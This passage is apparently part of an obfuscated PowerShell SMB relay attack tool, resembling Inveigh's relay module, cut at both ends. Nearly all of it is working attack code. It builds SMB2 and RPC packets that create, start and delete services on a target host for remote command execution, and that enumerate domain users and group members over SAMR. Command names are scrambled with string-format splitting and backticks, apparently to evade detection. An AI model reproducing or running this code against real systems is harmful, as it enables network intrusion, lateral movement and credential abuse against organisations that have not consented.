                            ${PACKEt_`SMB2`_he`ADer} = &("{1}{6}{3}{4}{2}{5}{0}"-f 'r','Ne','B2H','-Pack','etSM','eade','w') 0x09,0x00 0x01,0x00 ${f`ALSE} ${Mes`sA`gE_`iD} ${smb`_P`Ro`CeSs`_Id} ${tre`e`_iD} ${sE`SSIOn`_ID}
                            ${PAcK`eT_`S`c`m_Da`Ta} = &("{0}{1}{5}{2}{6}{3}{4}"-f 'New-P','a','e','rvi','ceW','ck','tSCMStartSe') ${SmB`_`sErVI`C`E_C`oN`TEXt`_H`AnDLe}
                            ${sc`m_`DAtA} = &("{5}{0}{3}{4}{1}{8}{2}{6}{7}"-f'nvert','ac','eredDic','Fro','m-P','Co','tiona','ry','ketOrd') ${p`AC`KeT`_scm_DaTa}
                            ${pAC`ke`T`_rpc_Da`TA} = &("{0}{4}{5}{3}{1}{2}"-f'New','Req','uest','PC','-P','acketR') 0x03 ${SC`m`_DaTA}."le`Ngth" 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            ${rp`C`_dATA} = &("{9}{1}{8}{7}{2}{5}{0}{3}{4}{10}{6}"-f'-Pack','n','Fro','e','tOrd','m','dDictionary','ert','v','Co','ere') ${PA`CK`et_`RPC`_DAta} 
                            ${P`ACkET_sMb2`_`DATA} = &("{4}{0}{3}{2}{5}{1}"-f 'e','quest','B2','w-PacketSM','N','WriteRe') ${sMb_`Fi`le`_ID} (${r`pC_dA`TA}."le`NgTH" + ${sCm_`Da`TA}."L`enGth")
                            ${S`MB2`_Hea`der} = &("{2}{3}{0}{5}{4}{6}{1}" -f'tOr','y','ConvertFrom-','Packe','c','deredDi','tionar') ${p`A`C`kET`_sMB`2_HEADEr}
                            ${sMb2`_d`AtA} = &("{6}{10}{1}{4}{2}{0}{3}{9}{7}{8}{5}"-f'c','PacketO','Di','t','rdered','ary','C','o','n','i','onvertFrom-') ${p`AckEt_s`MB`2`_`Data} 
                            ${rPc`_DATA_Le`N`GTh} = ${S`Mb`2_DatA}."LeNg`Th" + ${Sc`M_dA`TA}."len`gtH" + ${rp`C_d`Ata}."lE`NG`TH"
                            ${p`AC`K`Et`_NEtbios_SESsiO`N_sERvI`Ce} = &("{1}{2}{8}{7}{4}{3}{6}{5}{0}" -f'ce','New-P','a','BIOSSe','etNet','nServi','ssio','k','c') ${S`Mb2_H`E`AdeR}."leN`gTh" ${r`PC`_`DATA_l`ENGtH}
                            ${N`eT`Bi`oS_`seSsIoN`_sE`RViCE} = &("{0}{6}{5}{3}{1}{4}{2}" -f'Conv','eredDict','ary','rom-PacketOrd','ion','F','ert') ${PaCkeT_netb`ioS_s`essI`O`N`_seRv`ice}
                            ${C`li`e`Nt_Send} = ${NeTb`IO`S_Se`s`SION_seRv`i`CE} + ${Sm`B2`_`hEAdER} + ${SMB`2_`DA`Ta} + ${rPc`_da`TA} + ${sCM`_D`ATA}
                            ${STa`GE} = ("{2}{0}{1}{3}" -f'i','v','SendRece','e')   
                        }
                        elseif(  $Xv8qNb::"tO`sTrINg"(${C`l`ieNT_RECeIVe}[132..135]) -eq ("{1}{2}{0}" -f '-00','31','-04-00'))
                        {
                            ${INV`EIGh}."ou`Tpu`T_QuEue"."a`Dd"(("[!] [$(Get-Date -format s)] Service $SMB_service creation failed on $Target ")) > ${nu`ll}
                            ${sMb_REL`AY_f`AIl`ed} = ${Tr`UE}
                        }
                        else
                        {
                            ${smb_RELa`y`_`F`AILED} = ${T`Rue}
                        }

                    }

                    ("{2}{1}{0}"-f'ing','Pend','Status')
                    {
                        ${cLiE`N`T_stRe`Am}.("{1}{0}" -f 'd','Rea').Invoke(${c`L`IENt_R`ECe`IVE},0,${cli`EnT`_re`ceive}."LE`NgTh")

                        if( ( &("{1}{2}{0}"-f'variAblE','Get','-') XV8qNB  ).ValuE::"to`sTriNg"(${Clie`Nt_re`CE`iVE}[12..15]) -ne ("{3}{0}{1}{2}" -f'01','-00-0','0','03-'))
                        {
                            ${stA`GE} = ${s`T`AgE_NExt}
                        }

                    }

                    ("{0}{2}{1}" -f 'Stat','ived','usRece')
                    {

                        switch (${STA`gE_CU`RreNT})
                        {

                            ("{3}{1}{0}{2}" -f 'ues','eq','t','CloseR')
                            {
                                ${StA`gE} = ("{0}{3}{2}{1}"-f'Tree','t','connec','Dis')
                            }

                            ("{0}{3}{1}{2}" -f'CloseService','a','ndle','H')
                            {

                                if(${sMB_`C`LOs`e_SERV`i`ce`_`H`AndL`e_STAGe} -eq 2)
                                {
                                    ${StA`ge} = ("{2}{3}{1}{0}"-f'le','eHand','Close','Servic')
                                }
                                else
                                {
                                    ${sta`Ge} = ("{0}{1}{2}" -f 'CloseRe','ques','t')
                                }

                            }

                            ("{2}{0}{1}"-f's','t','CreateReque')
                            {
                                ${Fi`le_`ID} = ${Cl`IENt`_rECEIve}[132..147]
                                ${St`AgE} = ("{1}{0}"-f'PCBind','R')
                            }

                            ("{1}{2}{0}"-f'ateServiceW','Cr','e')
                            {
                                ${s`T`AGe} = ("{1}{0}{2}" -f'u','ReadReq','est')
                                ${sTAg`E_`N`ExT} = ("{0}{2}{1}{3}" -f 'S','t','tar','ServiceW')
                            }

                            ("{3}{0}{4}{5}{1}{2}"-f're','ir','st','C','ateServiceW','_F')
                            {

                                if(${sm`B`_spLI`T_`stAgE_`FiNAL} -le 2)
                                {
                                    ${s`TagE} = ("{3}{0}{2}{1}"-f 're','Last','ateServiceW_','C')
                                }
                                else
                                {
                                    ${sMB`_SpLIt`_st`A`GE} = 2
                                    ${sT`AgE} = ("{2}{3}{1}{0}"-f'_Middle','erviceW','Cr','eateS')
                                }
                                
                            }

                            ("{4}{3}{0}{2}{5}{6}{1}" -f 'c','le','e','ateServi','Cre','W_M','idd')
                            {

                                if(${s`MB_S`Pl`I`T_STa`GE} -ge ${sMB_sp`lit_Stag`e`_fI`NaL})
                                {
                                    ${stA`gE} = ("{3}{2}{4}{0}{1}" -f 's','t','rv','CreateSe','iceW_La')
                                }
                                else
                                {
                                    ${S`T`AgE} = ("{2}{0}{1}{3}{6}{5}{4}" -f'eat','eS','Cr','ervi','le','W_Midd','ce')
                                }

                            }

                            ("{4}{1}{2}{3}{0}" -f'st','ateSe','rvic','eW_La','Cre')
                            {
                                ${stA`gE} = ("{1}{0}{2}" -f'Req','Read','uest')
                                ${sT`A`Ge`_nexT} = ("{1}{0}{2}"-f'erv','StartS','iceW')
                            }

                            ("{0}{4}{1}{2}{3}"-f 'Dele','S','ervic','eW','te')
                            {
                                ${S`TA`Ge} = ("{0}{2}{1}" -f'Rea','t','dReques')
                                ${ST`Ag`e_`NEXT} = ("{3}{1}{2}{0}"-f'dle','ic','eHan','CloseServ')
                                ${Smb_`Cl`OSE_s`erVice_H`ANDlE_st`AGE} = 1
                            }

                            ("{0}{1}{2}"-f'Lo','go','ff')
                            {
                                ${StA`Ge} = ("{0}{1}" -f 'E','xit')
                            }

                            ("{2}{3}{1}{4}{0}" -f 'rW','C','O','penS','Manage')
                            {
                                ${S`Ta`ge} = ("{0}{1}{2}" -f 'R','eadReques','t')
                                ${sT`AGe`_nExt} = ("{2}{1}{0}"-f 's','Acces','Check') 
                            }

                            ("{2}{1}{0}" -f 'est','equ','ReadR')
                            {
                                ${s`TagE} = ${sTAg`e`_Ne`XT}
                            }

                            ("{1}{0}" -f 'CBind','RP')
                            {
                                ${sT`AgE} = ("{0}{1}{2}{3}"-f'R','eadRe','qu','est')
                                ${STa`Ge`_nEXT} = ("{2}{4}{3}{1}{0}" -f 'erW','Manag','Open','C','S')
                            }

                            ("{0}{1}{2}"-f'S','tartServ','iceW')
                            {
                                ${sTA`Ge} = ("{1}{0}{2}" -f 'dReques','Rea','t')
                                ${stAg`E_`Next} = ("{0}{1}{3}{2}"-f 'D','elete','iceW','Serv')  
                            }

                            ("{0}{2}{1}"-f'Tr','ect','eeConn')
                            {
                                ${TrE`e`_id} = ${C`LieN`T`_RECEi`Ve}[40..43]
                                ${st`A`ge} = ("{0}{1}{2}"-f 'Creat','eRe','quest')
                            }

                            ("{3}{0}{2}{1}" -f'nn','t','ec','TreeDisco')
                            {

                                if(${ATT`AcK} -contains ("{1}{0}{2}"-f'o','Sessi','n') -or ${a`TtaCk} -contains ("{2}{1}{0}" -f'te','cu','Exe'))
                                {
                                    ${i`NV`eiGH}."s`ESSIon_`messA`GE_iD`_tablE"[${IN`VE`IGH}."SEs`SI`oN`_CO`UNT"] = ${MesSa`gE`_id}
                                    ${sTA`gE} = ("{1}{0}"-f'it','Ex')
                                }
                                else
                                {
                                    ${S`Tage} = ("{1}{2}{0}"-f 'f','Lo','gof')
                                }

                            }

                        }

                    }

                    ("{0}{2}{1}"-f 'Tre','onnect','eC')
                    {
                        ${TRE`e_`id} = 0x00,0x00,0x00,0x00
                        ${M`ESS`A`ge_iD}++
                        ${STA`GE_`CU`Rr`EnT} = ${S`TAGE}
                        ${pACkEt_smb2_h`E`Ad`Er} = &("{2}{1}{0}{3}"-f'tSMB2','Packe','New-','Header') 0x03,0x00 0x01,0x00 ${fa`L`Se} ${me`s`Sage_ID} ${S`mB`_proc`esS_Id} ${tRE`E_`ID} ${s`essi`O`N_id}
                        ${pA`cKet_s`m`B2_DatA} = &("{2}{4}{3}{5}{0}{1}" -f'onnectReques','t','N','etSM','ew-Pack','B2TreeC') ${S`mb_`pATH_by`T`eS}
                        ${s`mB`2`_heAdER} = &("{1}{2}{3}{0}{5}{4}"-f 'deredD','C','onvertFr','om-PacketOr','ry','ictiona') ${pa`cKEt_sm`B`2_HE`A`deR}
                        ${S`mb2`_datA} = &("{3}{4}{1}{0}{2}{5}"-f'om-Pac','rtFr','ketOr','Conv','e','deredDictionary') ${p`AcK`et_SMB2_`d`Ata}    
                        ${P`ACkEt_nEtBIos_`Ses`S`iON_sE`RVice} = &("{6}{1}{5}{0}{7}{4}{3}{2}"-f 'k','P','ce','ervi','BIOSSessionS','ac','New-','etNet') ${smb2`_He`Ader}."L`EN`gth" ${Sm`B`2_data}."Le`Ng`Th"
                        ${n`EtB`ioS`_SEss`iON`_SERvicE} = &("{2}{4}{3}{5}{1}{0}"-f 'tionary','c','Co','rom-PacketOrdered','nvertF','Di') ${p`ACK`Et`_`NETbios_SESs`ION_Ser`VicE}
                        ${C`liE`NT_s`eND} = ${n`eTB`iOs`_SES`sIOn_Serv`icE} + ${Sm`B2_heA`Der} + ${smB`2_d`ATA}
                        ${s`T`AGe} = ("{2}{0}{1}" -f'en','dReceive','S')
                    }

                    ("{1}{2}{3}{0}{4}" -f 'onne','Tr','eeDis','c','ct')
                    {
                        ${Message`_`id}++
                        ${StA`gE_cuR`RenT} = ${ST`A`GE}
                        ${p`A`c`KeT_s`Mb2_heAd`ER} = &("{4}{1}{2}{6}{3}{0}{5}" -f'e','e','w-','SMB2Head','N','r','Packet') 0x04,0x00 0x01,0x00 ${F`A`LSe} ${mEs`S`A`gE_iD} ${Smb_pR`OCE`Ss_`Id} ${TREE_`ID} ${sessI`On_`iD}
                        ${PACkEt_SM`B2_`d`ATA} = &("{9}{1}{0}{3}{6}{7}{8}{4}{2}{5}" -f'-Pac','w','Reque','ketSMB2T','nnect','st','r','e','eDisco','Ne')
                        ${s`mb`2_he`AdEr} = &("{7}{0}{4}{5}{3}{8}{1}{6}{2}"-f 'rtFr','e','tionary','rde','om-Packe','tO','dDic','Conve','r') ${PaCk`ET`_S`MB2`_HeaDEr}
                        ${SMb2_`d`AtA} = &("{3}{9}{6}{2}{7}{0}{5}{8}{1}{4}" -f'rdere','r','P','Conve','y','dDic','m-','acketO','tiona','rtFro') ${pACkEt`_`smb2`_d`ATA}
                        ${PAC`K`eT`_`Net`B`i`oS_sEsSIOn_ServicE} = &("{5}{2}{6}{0}{4}{3}{1}"-f'etBIO','ce','ew-Packet','onServi','SSessi','N','N') ${S`Mb2`_h`EADeR}."LE`Ngth" ${SMb2_D`A`TA}."Le`NgTH"
                        ${nE`TbIos_se`sSI`On_S`e`Rv`IcE} = &("{0}{3}{6}{9}{5}{1}{7}{2}{8}{4}"-f'Con','der','ct','ve','y','-PacketOr','rtFr','edDi','ionar','om') ${PaC`k`E`T_NetbI`Os_sEs`SI`oN_seRVICE}
                        ${C`LieNT_sE`ND} = ${NeT`BioS_`sesSioN`_seR`VIcE} + ${Sm`B2`_heAd`er} + ${sMb2`_`dAtA}
                        ${S`T`AGE} = ("{0}{2}{3}{1}" -f'Se','ive','ndRe','ce')                        
                    }

                   

                }

                if(${SMB`_rE`lAY_fAi`lEd} -and ${a`TtA`ck} -notcontains ("{0}{2}{1}"-f 'Ses','ion','s'))
                {
                    ${I`Nvei`gh}."OUT`p`Ut_QUE`Ue"."a`Dd"(("[!] [$(Get-Date -format s)] Relay failed on $Target ")) > ${NU`LL}
                    ${S`TagE} = ("{1}{0}"-f 'it','Ex')
                }

            }
            catch
            {
                ${eR`Ro`R_MES`sa`ge} = ${_}."ex`Ce`p`TION"."mes`s`AgE"
                ${erRor`_M`E`SsaGe} = ${e`RrOR`_Mes`SaGE} -replace "`n",""
                ${iNV`EIGh}."O`Ut`pUT_qu`EUe"."a`DD"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current ")) > ${nu`lL}
                ${STa`GE} = ("{0}{1}"-f 'Exi','t')
            }

        }

        if(${aT`TA`Ck} -contains ("{0}{2}{1}" -f 'S','on','essi'))
        {
            return ${SMB_`AdmIniS`TR`AToR}
        }
        else
        {
            ${C`L`ient}.("{0}{1}" -f 'Clos','e').Invoke()
        }
            
    }

    function IN`VOKe`-smbReLay`ENum
    {
        param (${cLi`E`Nt},${sM`B`_USeR_`iD},${sessiO`N`_`ID},${pr`o`c`eSS_Id},${en`U`meRATE},${En`UM`eraTEG`ROUp})

        ${cLIen`T_`ReCe`IVE} = &("{2}{0}{1}"-f '-Obje','ct','New') ("{2}{0}{1}" -f'te','m.Byte[]','Sys') 81920
        ${Smb_sI`G`N`ing} = ${fA`L`SE}
        ${M`esSa`ge_Id} =  ${in`V`Eigh}."seSsIoN_mES`sAG`E`_i`d_tAbLE"[${Inve`i`GH}."sEsSiO`N_C`OuNt"]
        ${AcTi`On} = ${Enu`m`Era`TE}
        ${t`R`ee_Id} = 0x00,0x00,0x00,0x00
        ${gR`o`UP} = ${Enu`merate`Gro`UP}

        if(${AC`T`Ion} -eq 'All')
        {
            ${a`Cti`oN_STA`GE} = ("{0}{1}" -f 'gr','oup')
        }
        else
        {
            ${ACtiO`N_`STAgE} = ${aCTi`oN}    
        }

        ${pa`TH} = "\\" + ${TAR`G`ET} + "\IPC$"
        ${PAT`H_bY`TeS} =   ( &("{1}{2}{0}"-f 'dItem','CHI','l')  ("variAbLe"+":"+"IxG"+"D")).VAluE::"U`NIcODE".("{1}{2}{0}" -f'es','Ge','tByt').Invoke(${p`ATh})
        ${j} = 0
        ${stA`GE} = ("{3}{1}{2}{0}" -f 't','eCon','nec','Tre')
        ${c`L`ient_STReaM} = ${C`Lie`Nt}.("{2}{0}{1}" -f 'tStre','am','Ge').Invoke()
            
        while (${ST`A`GE} -ne ("{0}{1}"-f'Ex','it'))
        {

            try
            {
            
                switch (${StA`GE})
                {
        
                    ("{1}{2}{3}{0}" -f'equest','Clo','se','R')
                    {
                        ${M`ESsAge`_`iD}++
                        ${sT`A`GE_cu`Rr`eNt} = ${ST`Age}
                        ${PA`cket_s`M`B_HeAD`er} = &("{3}{0}{1}{2}"-f 'ac','ketSMB2','Header','New-P') 0x06,0x00 0x01,0x00 ${sm`B_S`iGNiNg} ${messA`gE_`iD} ${PrOCE`S`s_`id} ${T`R`eE_ID} ${SeS`sIon_`id}
                        ${pACKe`T_S`M`B_daTA} = &("{3}{1}{6}{0}{2}{5}{4}"-f 'SMB2Clo','-Packe','s','New','est','eRequ','t') ${Fi`Le_`id}
                        ${Sm`B_He`A`dER} = &("{0}{5}{3}{1}{2}{4}{6}{7}" -f'Conver','m-Pa','cketOrdered','ro','Dicti','tF','ona','ry') ${paCKeT_s`Mb`_h`eADer}
                        ${S`Mb`_dATA} = &("{2}{0}{3}{5}{1}{4}" -f'From-','redDict','Convert','PacketOr','ionary','de') ${PACK`E`T_`SmB_`DatA}
                        ${p`A`cKeT_n`eTBIoS_seSS`I`On_S`er`VIce} = &("{6}{8}{3}{2}{1}{7}{0}{4}{5}"-f 'e','i','s','es','r','vice','New-PacketNet','onS','BIOSS') ${Smb`_`h`EaDEr}."LEn`gtH" ${sm`B_Da`TA}."Le`NGTh"
                        ${n`ETbi`Os_sE`s`Si`on`_SErvI`CE} = &("{1}{5}{4}{3}{0}{2}"-f'n','Conve','ary','ctio','deredDi','rtFrom-PacketOr') ${P`ACk`eT_NE`TbioS_Se`ssIoN_`seRvI`ce}
                        ${CLiEn`T`_S`END} = ${n`e`TbioS_SESsIon_`SERv`ice} + ${s`Mb`_H`EAdeR} + ${S`mb_d`ATA}
                        ${sT`AgE} = ("{0}{1}{2}" -f'Se','ndReceiv','e')
                    }

                    ("{2}{1}{0}"-f 'ect2','n','Con')
                    {
                        ${mE`sSAg`E`_Id}++
                        ${STa`g`E_`cUrrent} = ${st`A`gE}
                        ${PAcKEt`_Sm`B`_H`eAd`ER} = &("{3}{1}{5}{2}{4}{0}"-f 'er','ketS','2He','New-Pac','ad','MB') 0x0b,0x00 0x01,0x00 ${Smb`_SiG`NI`NG} ${MeS`sA`GE_`Id} ${prO`c`EsS_`iD} ${T`R`ee_iD} ${s`E`ssIon`_id}
                        ${paC`Ket_S`AMr`_`DaTA} = &("{1}{3}{4}{2}{0}"-f '2','New','nnect','-','PacketSAMRCo') ${T`Arg`ET}
                        ${SaM`R_DA`TA} = &("{2}{8}{6}{5}{9}{4}{7}{3}{1}{0}" -f'y','r','Co','redDictiona','m-PacketOrd','tFr','er','e','nv','o') ${PAckET_S`Am`R`_`datA} 
                        ${packet_sm`B_`D`A`Ta} = &("{2}{1}{0}{3}{5}{4}"-f'tSMB','acke','New-P','2Io','est','ctlRequ') 0x17,0xc0,0x11,0x00 ${FiL`e_`iD} ${sAMr`_DA`TA}."l`EngTh" 4280
                        ${PA`CkE`T_RPC_dA`Ta} = &("{0}{1}{2}{3}"-f'New-Pack','etR','PCReq','uest') 0x03 ${s`AMR_d`Ata}."le`Ngth" 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00
                        ${r`PC_`dAtA} = &("{4}{0}{2}{6}{3}{5}{7}{1}"-f'tFro','onary','m-Pa','r','Conver','deredDic','cketO','ti') ${pACkEt_R`pC_`DATA}
                        ${sM`B`_hEad`Er} = &("{4}{0}{5}{8}{7}{1}{10}{6}{9}{3}{2}"-f 've','PacketOr','ary','on','Con','rt','t','-','From','i','deredDic') ${PACKE`T_Smb_he`Ad`er}
                        ${s`M`B_DAta} = &("{1}{0}{2}{3}{5}{4}" -f'vertFrom-PacketOrd','Con','e','redDicti','ry','ona') ${PacK`Et_S`MB_D`ATA} 
                        ${RPC_da`TA_L`EnG`TH} = ${SM`B_`DATA}."L`enG`TH" + ${R`p`C_`dAta}."lE`NGTH" + ${sa`m`R`_Data}."L`EnGth"
                        ${Pac`KE`T`_NE`TBios_`s`E`sSION_sErviCE} = &("{2}{1}{3}{7}{8}{4}{6}{5}{0}"-f'ce','cket','New-Pa','Net','e','Servi','ssion','BIO','SS') ${s`mb_h`E`ADEr}."Len`GTH" ${rPC`_D`ATa`_lEng`TH}
                        ${neTbIOS`_SE`sS`ION_SERv`I`CE} = &("{0}{2}{6}{3}{1}{4}{5}" -f 'C','rom-','o','ertF','PacketO','rderedDictionary','nv') ${pACKet`_`Ne`T`BIOS`_`SeSs`ioN_sER`VIcE}
                        ${cLIEnT`_Se`Nd} = ${NE`TBi`oS_SEsSI`on_serVI`cE} + ${SmB`_`hEADer} + ${smb`_`dATA} + ${rpc`_DA`TA} + ${SA`M`R_DA`TA}
                        ${ST`AGE} = ("{1}{0}{2}"-f 'ecei','SendR','ve')
                    }

                    ("{2}{1}{0}"-f 'ct5','onne','C')
                    {
                        ${m`EsSa`gE_`ID}++
                        ${sTA`gE`_`cU`RrENt} = ${ST`AgE}
                        ${P`Ac`k`eT`_s`mb_headER} = &("{3}{2}{1}{0}{4}" -f'B','acketSM','P','New-','2Header') 0x0b,0x00 0x01,0x00 ${smb_`s`IGN`inG} ${mES`S`Age_iD} ${PRo`cE`SS_id} ${Tr`ee_`Id} ${S`eSsI`O`N_Id}
                        ${paCK`E`T_sAM`R_Da`TA} = &("{1}{6}{5}{4}{0}{3}{2}" -f'nnec','New','5','t','tSAMRCo','Packe','-') ${TA`RGET}
                        ${sAMR_d`A`Ta} = &("{2}{3}{0}{5}{6}{1}{4}"-f'tFro','OrderedDiction','C','onver','ary','m-Pack','et') ${pACk`Et_S`AMr_`dATa} 
                        ${p`AckET_SM`B_D`A`TA} = &("{3}{4}{1}{0}{2}"-f 'oc','etSMB2I','tlRequest','New','-Pack') 0x17,0xc0,0x11,0x00 ${F`il`E_ID} ${sAM`R`_d`ATA}."L`eNgTH" 4280
                        ${paCK`et_rp`c_d`ATA} = &("{5}{2}{4}{3}{0}{1}"-f'R','equest','a','C','cketRP','New-P') 0x03 ${S`A`mr_Da`TA}."lE`NgtH" 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        ${RPC`_`daTa} = &("{6}{3}{0}{4}{2}{1}{5}" -f 'Pac','edDictio','der','rom-','ketOr','nary','ConvertF') ${packeT_R`pc_`DaTa}
                        ${smB`_heaD`eR} = &("{4}{3}{5}{8}{2}{6}{7}{1}{0}"-f'nary','o','cketOrderedD','er','Conv','tF','ic','ti','rom-Pa') ${paCK`eT_sM`B_`H`Eader}
                        ${smb`_d`ATA} = &("{2}{3}{4}{1}{5}{6}{8}{7}{0}{9}" -f'ictio','cket','C','onvertFrom-','Pa','O','r','D','dered','nary') ${PaCKeT`_Sm`B_D`A`TA} 
                        ${rpc_`Da`TA`_lenGtH} = ${smb_`D`ATA}."LeN`gTH" + ${R`pc_D`A`Ta}."L`ENGth" + ${SAM`R_Da`TA}."leN`gtH"
                        ${PaCk`Et`_NETbIo`S`_SesS`i`oN_sErvIcE} = &("{2}{4}{5}{1}{0}{3}" -f 'ic','erv','New','e','-PacketNetBI','OSSessionS') ${S`MB_He`Ad`Er}."LEn`gTH" ${RPC_`DAt`A_LEN`g`TH}
                        ${nE`TbIO`S_S`ESSI`On_serVICE} = &("{0}{9}{3}{8}{5}{7}{6}{2}{1}{4}" -f'C','tionar','redDic','nve','y','tFrom-','tOrde','Packe','r','o') ${PaCkET_Ne`TBI`O`s_s`eSs`ioN_`SerV`I`ce}
                        ${cLien`T_`sENd} = ${NETBio`S_se`ssi`On_`SE`Rv`icE} + ${Smb_`He`ADER} + ${smb_`Da`TA} + ${R`pc_dATA} + ${Sa`m`R_dAta}
                        ${sT`AGE} = ("{0}{1}{2}" -f'Send','Rec','eive')
                    }

                    ("{0}{3}{2}{1}" -f'Cre','t','teReques','a')
                    {
                        ${m`EsS`A`ge_id}++
                        ${S`TagE_CUR`ReNt} = ${S`TA`ge}
                        ${PaC`keT_`Smb`_HEaDeR} = &("{1}{3}{2}{0}{4}" -f 'etSM','Ne','Pack','w-','B2Header') 0x05,0x00 0x01,0x00 ${sMB`_s`I`GnIng} ${ME`ssA`gE_id} ${pR`ocEs`S_id} ${tR`E`e_Id} ${s`e`S`sION_Id}
                        ${pA`cke`T_SM`B_daTA} = &("{0}{4}{5}{1}{6}{3}{2}{7}"-f 'New-PacketS','re','es','eRequ','M','B2C','at','tFile') ${nAMeD`_`pI`PE}
                        ${smb_he`A`D`eR} = &("{4}{9}{7}{1}{2}{0}{3}{6}{5}{8}"-f'm-Pac','Fr','o','ketOr','Co','Diction','dered','vert','ary','n') ${pACkET_SM`B`_HEAd`eR}
                        ${s`MB_DA`Ta} = &("{2}{3}{8}{1}{5}{7}{9}{0}{4}{10}{6}"-f't','Fr','C','on','OrderedDictiona','om','y','-P','vert','acke','r') ${PA`ck`et_sMb_DA`TA}  
                        ${P`AcKE`T_`N`etBiO`s_S`E`ssiOn_servIce} = &("{2}{0}{3}{1}{4}{5}"-f 'w','cket','Ne','-Pa','NetBIOSSessionServ','ice') ${SmB_`HeA`DER}."Le`N`gTh" ${SM`B_d`ATa}."L`e`NGTh"
                        ${nEtbIO`S_`SE`s`sIoN_`Se`RVIcE} = &("{0}{4}{6}{2}{5}{1}{3}" -f'ConvertFrom-P','ona','e','ry','ac','dDicti','ketOrder') ${PaCKE`T`_nETbIoS_S`e`ss`IOn_S`eRviCE}
                        ${CLIEN`T`_`SEnD} = ${nET`B`Ios_SESs`i`oN`_SeR`VIcE} + ${smB`_`heADer} + ${smB_`da`TA}
                        ${s`T`AGE} = ("{0}{1}{2}"-f 'SendRe','c','eive')
                    }

                    ("{2}{1}{3}{0}" -f 'inUsers','mDo','Enu','ma')
                    {
                        ${M`esSAg`E_`id}++
                        ${St`Ag`e_curREnt} = ${S`Ta`gE}
                        ${pac`K`ET_s`Mb_HeAder} = &("{3}{0}{2}{4}{1}" -f 'tS','r','M','New-Packe','B2Heade') 0x0b,0x00 0x01,0x00 ${s`m`B_Si`gNIng} ${MEs`SAG`E_iD} ${prOC`es`s_iD} ${tRee`_`Id} ${s`ESs`ioN_id}
                        ${p`A`ckeT_SA`Mr_data} = &("{4}{6}{0}{1}{2}{3}{5}" -f'-PacketSA','MREnumDo','mainU','ser','Ne','s','w') ${SAmR_`DOMa`in_`HanD`LE}
                        ${sa`mR_`DATa} = &("{4}{1}{9}{6}{7}{8}{2}{3}{0}{5}"-f 'onar','om','deredD','icti','ConvertFr','y','acket','O','r','-P') ${PaCK`E`T`_SAmr_DAtA} 
                        ${pAcK`Et`_r`Pc`_dAta} = &("{0}{4}{2}{5}{3}{1}"-f'New','quest','etRP','e','-Pack','CR') 0x03 ${s`AmR`_DaTA}."lEN`GTH" 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        ${pAc`k`Et_S`mB_`daTA} = &("{3}{0}{4}{1}{2}{5}"-f'w-','I','octlReque','Ne','PacketSMB2','st') 0x17,0xc0,0x11,0x00 ${F`I`lE_id} ${SaMR`_d`ATA}."LEnG`Th" 4280
                        ${Rp`C_da`TA} = &("{8}{1}{9}{6}{3}{4}{2}{5}{0}{7}{10}" -f 'Dictio','F','Ordere','k','et','d','ac','n','Convert','rom-P','ary') ${pac`Ket`_R`pc`_dAtA}
                        ${S`MB`_h`EaDER} = &("{6}{1}{2}{5}{3}{8}{7}{9}{0}{4}"-f'ti','onver','tFr','Pa','onary','om-','C','rderedD','cketO','ic') ${P`ACket`_`Smb_heADER}
                        ${SMb`_d`ATA} = &("{2}{1}{6}{7}{0}{4}{8}{3}{5}" -f'P','on','C','deredDictio','a','nary','ve','rtFrom-','cketOr') ${P`AckET_Smb_D`Ata} 
                        ${rp`C_daTA_`Le`N`GTH} = ${Smb_`dAtA}."LE`NgTH" + ${R`pC_D`ATA}."L`ENgTH" + ${Samr_`da`Ta}."lEn`gTh"
                        ${PA`cKeT_`N`eTbio`S_SEssiOn_Se`Rvi`CE} = &("{0}{4}{8}{7}{3}{2}{1}{9}{5}{6}" -f'Ne','BIOSSess','t','acketNe','w','nS','ervice','P','-','io') ${sMB`_`HEaDER}."l`eNGtH" ${RPc_D`ATa`_`LeNg`TH}
                        ${nEtBio`s_sEssION`_`S`e`RV`icE} = &("{1}{3}{2}{6}{0}{5}{4}" -f'eredDicti','Conve','om-Pack','rtFr','ry','ona','etOrd') ${PACke`T_`NETBiO`S_`SESS`ion_se`Rv`i`Ce}
                        ${cL`ienT`_seND} = ${ne`Tb`ios_S`E`Ss`ioN_SEr`Vi`Ce} + ${s`m`B_H`eaDER} + ${Smb_d`A`Ta} + ${Rpc_`d`ATA} + ${Sa`Mr_Da`TA}
                        ${S`TAge} = ("{0}{2}{1}"-f 'SendRe','ve','cei')
                    }

                    ("{3}{4}{1}{0}{2}" -f'ber','m','sInAlias','Ge','tMe')
                    {
                        ${mES`Sage_`id}++
                        ${s`TAge_C`U`R`ReNt} = ${ST`Age}
                        ${pa`cK`Et_smB`_`HE`ADeR} = &("{1}{3}{2}{5}{4}{0}"-f'er','New-','etSMB','Pack','Head','2') 0x0b,0x00 0x01,0x00 ${s`MB_Sig`NI`Ng} ${Mess`A`Ge_iD} ${pro`CE`sS_iD} ${T`R`eE_id} ${SES`S`IoN_ID}
                        ${pA`CKE`T`_saMr`_DATA} = &("{2}{3}{0}{4}{1}{5}"-f'Pack','mb','Ne','w-','etSAMRGetMe','ersInAlias') ${SAMR`_`PoL`I`C`y_h`Andle}
                        ${sAM`R_D`A`Ta} = &("{0}{6}{3}{1}{8}{2}{7}{4}{5}" -f 'Co','tFrom','redDi','er','n','ary','nv','ctio','-PacketOrde') ${pa`ckET`_SaMr`_Da`TA} 
                        ${PAcKEt_r`p`c_Da`Ta} = &("{2}{5}{3}{4}{0}{1}"-f 'que','st','New','a','cketRPCRe','-P') 0x03 ${SA`m`R_da`Ta}."lEn`GTh" 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00
                        ${PACk`ET_`SMB`_`DA`Ta} = &("{1}{2}{4}{5}{3}{0}" -f 'st','New-Pac','k','B2IoctlReque','e','tSM') 0x17,0xc0,0x11,0x00 ${f`IlE_`Id} ${S`AM`R_Da`Ta}."le`NGth" 4280
                        ${rPc_`d`ATA} = &("{8}{0}{5}{1}{2}{6}{4}{7}{3}" -f'rtFrom-','acketOr','d','ionary','Di','P','ered','ct','Conve') ${PaC`K`E`T_`RPc_Data}
